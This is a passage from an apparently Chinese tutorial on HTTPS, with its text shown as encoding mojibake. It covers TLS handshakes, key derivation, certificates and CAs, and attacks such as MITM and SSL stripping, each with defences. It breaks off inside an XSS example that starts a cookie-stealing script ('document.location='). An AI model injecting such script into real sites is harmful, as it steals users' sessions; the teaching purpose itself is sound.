&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-bullet">   -</span> é€‰æ‹©çš„TLSç‰ˆæœ¬<br><span class="hljs-bullet">   -</span> é€‰æ‹©çš„åŠ å¯†å¥—ä»¶<br><span class="hljs-bullet">   -</span> éšæœºæ•°ï¼ˆServer Randomï¼‰<br><br><span class="hljs-bullet">3.</span> Certificateï¼ˆè¯ä¹¦ï¼‰<br>   &lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-bullet">   -</span> æœåŠ¡å™¨çš„æ•°å­—è¯ä¹¦<br><span class="hljs-bullet">   -</span> åŒ…å«å…¬é’¥<br><br><span class="hljs-bullet">4.</span> ServerHelloDone<br>   &lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><br><span class="hljs-bullet">5.</span> éªŒè¯è¯ä¹¦<br><span class="hljs-bullet">   -</span> æ£€æŸ¥è¯ä¹¦æœ‰æ•ˆæ€§<br><span class="hljs-bullet">   -</span> éªŒè¯CAç­¾å<br><span class="hljs-bullet">   -</span> æ£€æŸ¥åŸŸååŒ¹é…<br><br><span class="hljs-bullet">6.</span> ClientKeyExchange<br>   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;<br><span class="hljs-bullet">   -</span> ç”Ÿæˆé¢„ä¸»å¯†é’¥ï¼ˆPre-Master Secretï¼‰<br><span class="hljs-bullet">   -</span> ç”¨æœåŠ¡å™¨å…¬é’¥åŠ å¯†<br><span class="hljs-bullet">   -</span> å‘é€ç»™æœåŠ¡å™¨<br><br><span class="hljs-bullet">7.</span> åŒæ–¹è®¡ç®—<br>   å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½è®¡ç®—ï¼š<br>   ä¸»å¯†é’¥ï¼ˆMaster Secretï¼‰= PRF(<br><span class="hljs-code">       Pre-Master Secret,</span><br><span class="hljs-code">       Client Random,</span><br><span class="hljs-code">       Server Random</span><br><span class="hljs-code">   )</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">8.</span> ChangeCipherSpec<br>   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;<br><span class="hljs-bullet">   -</span> é€šçŸ¥ï¼šåç»­ä½¿ç”¨åŠ å¯†é€šä¿¡<br><br><span class="hljs-bullet">9.</span> Finishedï¼ˆåŠ å¯†ï¼‰<br>   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;<br><span class="hljs-bullet">   -</span> åŠ å¯†çš„æ¡æ‰‹æ¶ˆæ¯æ‘˜è¦<br><br><span class="hljs-bullet">10.</span> ChangeCipherSpec<br><span class="hljs-code">    &lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">11.</span> Finishedï¼ˆåŠ å¯†ï¼‰<br><span class="hljs-code">    &lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">12.</span> åº”ç”¨æ•°æ®ï¼ˆåŠ å¯†ï¼‰<br><span class="hljs-code">    &lt;â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•&gt;</span><br><span class="hljs-code"></span><br>æ¡æ‰‹å®Œæˆï¼<br>RTTï¼ˆå¾€è¿”æ—¶é—´ï¼‰ï¼š2-RTT<br></code></pre></td></tr></table></figure><p><strong>å¯†é’¥æ¨å¯¼</strong>ï¼š</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">ææ–™ï¼š<br>- Client Randomï¼ˆå®¢æˆ·ç«¯éšæœºæ•°ï¼‰<br>- Server Randomï¼ˆæœåŠ¡å™¨éšæœºæ•°ï¼‰<br>- Pre-<span class="hljs-keyword">Master</span> <span class="hljs-title">Secret</span>ï¼ˆé¢„ä¸»å¯†é’¥ï¼Œ<span class="hljs-number">48</span>å­—èŠ‚ï¼‰<br><br>è®¡ç®—ï¼š<br><span class="hljs-keyword">Master</span> <span class="hljs-title">Secret</span> = PRF(<br>    Pre-<span class="hljs-keyword">Master</span> <span class="hljs-title">Secret</span>,<br>    <span class="hljs-string">&quot;master secret&quot;</span>,<br>    Client Random + Server Random<br>)<br><br>ä»<span class="hljs-keyword">Master</span> <span class="hljs-title">Secret</span>æ´¾ç”Ÿï¼š<br>- å®¢æˆ·ç«¯åŠ å¯†å¯†é’¥<br>- æœåŠ¡å™¨åŠ å¯†å¯†é’¥<br>- å®¢æˆ·ç«¯MACå¯†é’¥<br>- æœåŠ¡å™¨MACå¯†é’¥<br>- å®¢æˆ·ç«¯IV<br>- æœåŠ¡å™¨IV<br></code></pre></td></tr></table></figure><h3 id="4-2-TLS-1-3-æ¡æ‰‹ï¼ˆä¼˜åŒ–ï¼‰"><a href="#4-2-TLS-1-3-æ¡æ‰‹ï¼ˆä¼˜åŒ–ï¼‰" class="headerlink" title="4.2 TLS 1.3 æ¡æ‰‹ï¼ˆä¼˜åŒ–ï¼‰"></a>4.2 TLS 1.3 æ¡æ‰‹ï¼ˆä¼˜åŒ–ï¼‰</h3><p><strong>æ”¹è¿›</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TLS 1.3çš„ä¼˜åŒ–ï¼š<br><br><span class="hljs-bullet">1.</span> 1-RTTæ¡æ‰‹<br><span class="hljs-bullet">   -</span> TLS 1.2ï¼š2-RTT<br><span class="hljs-bullet">   -</span> TLS 1.3ï¼š1-RTT<br><span class="hljs-bullet">   -</span> æ›´å¿«ï¼<br><br><span class="hljs-bullet">2.</span> 0-RTTæ¢å¤<br><span class="hljs-bullet">   -</span> ä¼šè¯æ¢å¤<br><span class="hljs-bullet">   -</span> ç›´æ¥å‘é€æ•°æ®<br><span class="hljs-bullet">   -</span> æœ€å¿«ï¼<br><br><span class="hljs-bullet">3.</span> ç®€åŒ–å¯†ç å¥—ä»¶<br><span class="hljs-bullet">   -</span> ç§»é™¤ä¸å®‰å…¨ç®—æ³•<br><span class="hljs-bullet">   -</span> åªä¿ç•™AEAD<br><span class="hljs-bullet">   -</span> æ›´å®‰å…¨ï¼<br><br>æµç¨‹ï¼š<br><br>å®¢æˆ·ç«¯                           æœåŠ¡å™¨<br><br><span class="hljs-bullet">1.</span> ClientHello + KeyShare<br>   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;<br><span class="hljs-bullet">   -</span> æ”¯æŒçš„åŠ å¯†å¥—ä»¶<br><span class="hljs-bullet">   -</span> å¯†é’¥äº¤æ¢å‚æ•°ï¼ˆçŒœæµ‹ï¼‰<br><span class="hljs-bullet">   -</span> éšæœºæ•°<br><br><span class="hljs-bullet">2.</span> ServerHello + KeyShare<br><span class="hljs-bullet">   +</span> Certificate<br><span class="hljs-bullet">   +</span> Finished<br>   &lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-bullet">   -</span> é€‰æ‹©çš„åŠ å¯†å¥—ä»¶<br><span class="hljs-bullet">   -</span> å¯†é’¥äº¤æ¢å‚æ•°<br><span class="hljs-bullet">   -</span> è¯ä¹¦<br><span class="hljs-bullet">   -</span> å®Œæˆ<br><br><span class="hljs-bullet">3.</span> Finished<br>   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;<br><br><span class="hljs-bullet">4.</span> åº”ç”¨æ•°æ®ï¼ˆåŠ å¯†ï¼‰<br>   &lt;â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•&gt;<br><br>æ¡æ‰‹å®Œæˆï¼<br>RTTï¼š1-RTTï¼ˆå¿«ä¸€å€ï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="5-æ•°å­—è¯ä¹¦"><a href="#5-æ•°å­—è¯ä¹¦" class="headerlink" title="5. æ•°å­—è¯ä¹¦"></a>5. æ•°å­—è¯ä¹¦</h2><h3 id="5-1-ä»€ä¹ˆæ˜¯æ•°å­—è¯ä¹¦ï¼Ÿ"><a href="#5-1-ä»€ä¹ˆæ˜¯æ•°å­—è¯ä¹¦ï¼Ÿ" class="headerlink" title="5.1 ä»€ä¹ˆæ˜¯æ•°å­—è¯ä¹¦ï¼Ÿ"></a>5.1 ä»€ä¹ˆæ˜¯æ•°å­—è¯ä¹¦ï¼Ÿ</h3><p><strong>è¯ä¹¦ &#x3D; æœåŠ¡å™¨çš„èº«ä»½è¯</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æ•°å­—è¯ä¹¦åŒ…å«ï¼š<br><span class="hljs-bullet">- </span>åŸŸåï¼ˆexample.comï¼‰<br><span class="hljs-bullet">- </span>å…¬é’¥<br><span class="hljs-bullet">- </span>è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰<br><span class="hljs-bullet">- </span>æœ‰æ•ˆæœŸ<br><span class="hljs-bullet">- </span>CAçš„æ•°å­—ç­¾å<br><br>ä½œç”¨ï¼š<br>è¯æ˜&quot;è¿™ä¸ªå…¬é’¥ç¡®å®å±äºexample.com&quot;<br><br>ç”Ÿæ´»ç±»æ¯”ï¼š<br>èº«ä»½è¯ï¼š<br><span class="hljs-bullet">- </span>ç…§ç‰‡<br><span class="hljs-bullet">- </span>å§“å<br><span class="hljs-bullet">- </span>èº«ä»½è¯å·<br><span class="hljs-bullet">- </span>å…¬å®‰å±€ç›–ç« <br><br>æ•°å­—è¯ä¹¦ï¼š<br><span class="hljs-bullet">- </span>å…¬é’¥<br><span class="hljs-bullet">- </span>åŸŸå<br><span class="hljs-bullet">- </span>åºåˆ—å·<br><span class="hljs-bullet">- </span>CAç­¾å<br></code></pre></td></tr></table></figure><h3 id="5-2-CAï¼ˆè¯ä¹¦é¢å‘æœºæ„ï¼‰"><a href="#5-2-CAï¼ˆè¯ä¹¦é¢å‘æœºæ„ï¼‰" class="headerlink" title="5.2 CAï¼ˆè¯ä¹¦é¢å‘æœºæ„ï¼‰"></a>5.2 CAï¼ˆè¯ä¹¦é¢å‘æœºæ„ï¼‰</h3><p><strong>ä¿¡ä»»é“¾</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">è¯ä¹¦ä¿¡ä»»é“¾ï¼š<br><br>æ ¹CAï¼ˆRoot CAï¼‰<br>  â””â”€ ä¸­é—´CAï¼ˆIntermediate CAï¼‰<br><span class="hljs-code">      â””â”€ ç½‘ç«™è¯ä¹¦ï¼ˆEnd-entity Certificateï¼‰</span><br><span class="hljs-code"></span><br>ç¤ºä¾‹ï¼š<br>DigiCert Root CA<br>  â””â”€ DigiCert SHA2 Secure Server CA<br><span class="hljs-code">      â””â”€ example.com</span><br><span class="hljs-code"></span><br>éªŒè¯è¿‡ç¨‹ï¼š<br><span class="hljs-bullet">1.</span> æµè§ˆå™¨æ”¶åˆ°example.comè¯ä¹¦<br><span class="hljs-bullet">2.</span> éªŒè¯example.comè¯ä¹¦çš„ç­¾åï¼ˆç”¨ä¸­é—´CAå…¬é’¥ï¼‰<br><span class="hljs-bullet">3.</span> éªŒè¯ä¸­é—´CAè¯ä¹¦çš„ç­¾åï¼ˆç”¨æ ¹CAå…¬é’¥ï¼‰<br><span class="hljs-bullet">4.</span> æ£€æŸ¥æ ¹CAæ˜¯å¦åœ¨ä¿¡ä»»åˆ—è¡¨ä¸­<br><br>æ ¹CAï¼š<br><span class="hljs-bullet">-</span> é¢„è£…åœ¨æ“ä½œç³»ç»Ÿ/æµè§ˆå™¨ä¸­<br><span class="hljs-bullet">-</span> æ•°é‡æœ‰é™ï¼ˆçº¦200ä¸ªï¼‰<br><span class="hljs-bullet">-</span> é«˜åº¦å¯ä¿¡<br></code></pre></td></tr></table></figure><p><strong>è‘—åCA</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">å•†ä¸šCAï¼š<br><span class="hljs-bullet">- </span>DigiCert<br><span class="hljs-bullet">- </span>GlobalSign<br><span class="hljs-bullet">- </span>GoDaddy<br><span class="hljs-bullet">- </span>Comodoï¼ˆç°åœ¨å«Sectigoï¼‰<br><br>å…è´¹CAï¼š<br><span class="hljs-bullet">- </span>Let&#x27;s Encryptï¼ˆæœ€æµè¡Œï¼‰<br><span class="hljs-bullet">- </span>ZeroSSL<br><span class="hljs-bullet">- </span>Cloudflare<br><br>è‡ªç­¾åè¯ä¹¦ï¼š<br><span class="hljs-bullet">- </span>è‡ªå·±ç»™è‡ªå·±ç­¾å<br><span class="hljs-bullet">- </span>ä¸è¢«ä¿¡ä»»<br><span class="hljs-bullet">- </span>åªç”¨äºæµ‹è¯•<br></code></pre></td></tr></table></figure><h3 id="5-3-è¯ä¹¦ç±»å‹"><a href="#5-3-è¯ä¹¦ç±»å‹" class="headerlink" title="5.3 è¯ä¹¦ç±»å‹"></a>5.3 è¯ä¹¦ç±»å‹</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æŒ‰éªŒè¯çº§åˆ«ï¼š<br><br><span class="hljs-bullet">1.</span> DVï¼ˆDomain Validationï¼‰<br><span class="hljs-bullet">   -</span> åŸŸåéªŒè¯<br><span class="hljs-bullet">   -</span> æœ€åŸºç¡€<br><span class="hljs-bullet">   -</span> éªŒè¯ï¼šæ‹¥æœ‰åŸŸåæ§åˆ¶æƒ<br><span class="hljs-bullet">   -</span> ç”¨é€”ï¼šä¸ªäººç½‘ç«™ã€åšå®¢<br><span class="hljs-bullet">   -</span> ä»·æ ¼ï¼šå…è´¹/ä¾¿å®œ<br><br><span class="hljs-bullet">2.</span> OVï¼ˆOrganization Validationï¼‰<br><span class="hljs-bullet">   -</span> ç»„ç»‡éªŒè¯<br><span class="hljs-bullet">   -</span> ä¸­ç­‰<br><span class="hljs-bullet">   -</span> éªŒè¯ï¼šåŸŸå + ç»„ç»‡çœŸå®æ€§<br><span class="hljs-bullet">   -</span> ç”¨é€”ï¼šä¼ä¸šç½‘ç«™<br><span class="hljs-bullet">   -</span> ä»·æ ¼ï¼šä¸­ç­‰<br><br><span class="hljs-bullet">3.</span> EVï¼ˆExtended Validationï¼‰<br><span class="hljs-bullet">   -</span> æ‰©å±•éªŒè¯<br><span class="hljs-bullet">   -</span> æœ€é«˜çº§<br><span class="hljs-bullet">   -</span> éªŒè¯ï¼šä¸¥æ ¼çš„ç»„ç»‡å®¡æŸ¥<br><span class="hljs-bullet">   -</span> æ˜¾ç¤ºï¼šç»¿è‰²åœ°å€æ ï¼ˆæ—§ç‰ˆæµè§ˆå™¨ï¼‰<br><span class="hljs-bullet">   -</span> ç”¨é€”ï¼šé“¶è¡Œã€ç”µå•†<br><span class="hljs-bullet">   -</span> ä»·æ ¼ï¼šæ˜‚è´µ<br><br>æŒ‰è¦†ç›–èŒƒå›´ï¼š<br><br><span class="hljs-bullet">1.</span> å•åŸŸåè¯ä¹¦<br>   example.com âœ…<br>   www.example.com âŒ<br><br><span class="hljs-bullet">2.</span> é€šé…ç¬¦è¯ä¹¦<br>   example.com âœ…<br>   www.example.com âœ…<br>   api.example.com âœ…<br>   <span class="hljs-emphasis">*.example.com âœ…</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">3. å¤šåŸŸåè¯ä¹¦ï¼ˆSANï¼‰</span><br><span class="hljs-emphasis">   example.com âœ…</span><br><span class="hljs-emphasis">   example.net âœ…</span><br><span class="hljs-emphasis">   example.org âœ…</span><br></code></pre></td></tr></table></figure><h3 id="5-4-è¯ä¹¦æ ¼å¼"><a href="#5-4-è¯ä¹¦æ ¼å¼" class="headerlink" title="5.4 è¯ä¹¦æ ¼å¼"></a>5.4 è¯ä¹¦æ ¼å¼</h3><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs ldif">PEMï¼ˆPrivacy Enhanced Mailï¼‰<br><span class="hljs-literal">-</span> æœ€å¸¸ç”¨<br><span class="hljs-literal">-</span> Base64ç¼–ç <br><span class="hljs-literal">-</span> æ–‡æœ¬æ ¼å¼<br><span class="hljs-literal">-</span> æ‰©å±•åï¼š.pem, .crt, .cer, .key<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-literal">-</span>----BEGIN CERTIFICATE-----<br>MIIDXTCCAkWgAwIBAgIJAKL0UG+mRbSjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV<br>...<br><span class="hljs-literal">-</span>----END CERTIFICATE-----<br><br>DERï¼ˆDistinguished Encoding Rulesï¼‰<br><span class="hljs-literal">-</span> äºŒè¿›åˆ¶æ ¼å¼<br><span class="hljs-literal">-</span> æ‰©å±•åï¼š.der, .cer<br><br>PKCS<span class="hljs-comment">#12 / PFX</span><br><span class="hljs-literal">-</span> åŒ…å«è¯ä¹¦å’Œç§é’¥<br><span class="hljs-literal">-</span> æœ‰å¯†ç ä¿æŠ¤<br><span class="hljs-literal">-</span> æ‰©å±•åï¼š.p12, .pfx<br><span class="hljs-literal">-</span> ç”¨äºå¯¼å…¥/å¯¼å‡º<br><br>è¯ä¹¦é“¾æ–‡ä»¶ï¼š<br><span class="hljs-literal">-</span> åŒ…å«å¤šä¸ªè¯ä¹¦<br><span class="hljs-literal">-</span> ä»ç½‘ç«™è¯ä¹¦åˆ°æ ¹CA<br><span class="hljs-literal">-</span> fullchain.pem<br></code></pre></td></tr></table></figure><hr><h2 id="6-å¸¸è§Webå®‰å…¨æ”»å‡»"><a href="#6-å¸¸è§Webå®‰å…¨æ”»å‡»" class="headerlink" title="6. å¸¸è§Webå®‰å…¨æ”»å‡»"></a>6. å¸¸è§Webå®‰å…¨æ”»å‡»</h2><h3 id="6-1-ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰"><a href="#6-1-ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰" class="headerlink" title="6.1 ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰"></a>6.1 ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ”»å‡»åœºæ™¯ï¼š<br><br>æ­£å¸¸é€šä¿¡ï¼š<br>å®¢æˆ·ç«¯ â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’ æœåŠ¡å™¨<br><br>ä¸­é—´äººæ”»å‡»ï¼š<br>å®¢æˆ·ç«¯ â†â”€â†’ æ”»å‡»è€… â†â”€â†’ æœåŠ¡å™¨<br><span class="hljs-code">         ï¼ˆå†’å……ï¼‰</span><br><span class="hljs-code"></span><br>æ”»å‡»æ­¥éª¤ï¼š<br><span class="hljs-bullet">1.</span> å®¢æˆ·ç«¯è¯·æ±‚è¿æ¥æœåŠ¡å™¨<br><span class="hljs-bullet">2.</span> æ”»å‡»è€…æˆªè·è¯·æ±‚<br><span class="hljs-bullet">3.</span> æ”»å‡»è€…è¿æ¥æœåŠ¡å™¨<br><span class="hljs-bullet">4.</span> æ”»å‡»è€…å†’å……æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šä¿¡<br><span class="hljs-bullet">5.</span> æ”»å‡»è€…çªƒå¬/ç¯¡æ”¹æ•°æ®<br><br>é˜²å¾¡ï¼š<br>âœ… ä½¿ç”¨HTTPS<br>âœ… éªŒè¯è¯ä¹¦<br>âœ… è¯ä¹¦å›ºå®šï¼ˆCertificate Pinningï¼‰<br>âœ… HSTSï¼ˆå¼ºåˆ¶HTTPSï¼‰<br></code></pre></td></tr></table></figure><h3 id="6-2-SSLå‰¥ç¦»æ”»å‡»"><a href="#6-2-SSLå‰¥ç¦»æ”»å‡»" class="headerlink" title="6.2 SSLå‰¥ç¦»æ”»å‡»"></a>6.2 SSLå‰¥ç¦»æ”»å‡»</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ”»å‡»åŸç†ï¼š<br>å°†HTTPSé™çº§ä¸ºHTTP<br><br>æ”»å‡»æ­¥éª¤ï¼š<br><span class="hljs-bullet">1.</span> ç”¨æˆ·è®¿é—® http://bank.com<br><span class="hljs-bullet">2.</span> æœåŠ¡å™¨é‡å®šå‘ https://bank.com<br><span class="hljs-bullet">3.</span> æ”»å‡»è€…æˆªè·é‡å®šå‘<br><span class="hljs-bullet">4.</span> æ”»å‡»è€…ä¸æœåŠ¡å™¨å»ºç«‹HTTPSè¿æ¥<br><span class="hljs-bullet">5.</span> æ”»å‡»è€…ä¸å®¢æˆ·ç«¯ä½¿ç”¨HTTPé€šä¿¡<br><span class="hljs-bullet">6.</span> å®¢æˆ·ç«¯ä»¥ä¸ºåœ¨ç”¨HTTPSï¼ˆå…¶å®æ˜¯HTTPï¼‰<br><br>é˜²å¾¡ï¼š<br>âœ… HSTSï¼ˆå¼ºåˆ¶HTTPSï¼Œä¸å…è®¸é™çº§ï¼‰<br>âœ… ä¸ä½¿ç”¨HTTPç‰ˆæœ¬<br>âœ… æµè§ˆå™¨ç›´æ¥è¾“å…¥https://<br></code></pre></td></tr></table></figure><h3 id="6-3-è¯ä¹¦æ¬ºè¯ˆ"><a href="#6-3-è¯ä¹¦æ¬ºè¯ˆ" class="headerlink" title="6.3 è¯ä¹¦æ¬ºè¯ˆ"></a>6.3 è¯ä¹¦æ¬ºè¯ˆ</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æ”»å‡»æ–¹å¼ï¼š<br><span class="hljs-bullet">- </span>è‡ªç­¾åè¯ä¹¦<br><span class="hljs-bullet">- </span>ä¼ªé€ è¯ä¹¦<br><span class="hljs-bullet">- </span>è¿‡æœŸè¯ä¹¦<br><br>é˜²å¾¡ï¼š<br>âœ… æµè§ˆå™¨è¯ä¹¦éªŒè¯<br>âœ… è¯ä¹¦é€æ˜åº¦ï¼ˆCTï¼‰<br>âœ… å…¬é’¥å›ºå®š<br>âœ… è­¦æƒ•è¯ä¹¦è­¦å‘Š<br></code></pre></td></tr></table></figure><h3 id="6-4-å…¶ä»–æ”»å‡»"><a href="#6-4-å…¶ä»–æ”»å‡»" class="headerlink" title="6.4 å…¶ä»–æ”»å‡»"></a>6.4 å…¶ä»–æ”»å‡»</h3><p><strong>XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰</strong>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">åŸç†ï¼š<br>æ³¨å…¥æ¶æ„JavaScriptä»£ç <br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// ç›—å–Cookie</span></span><br><span class="language-javascript">  <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span 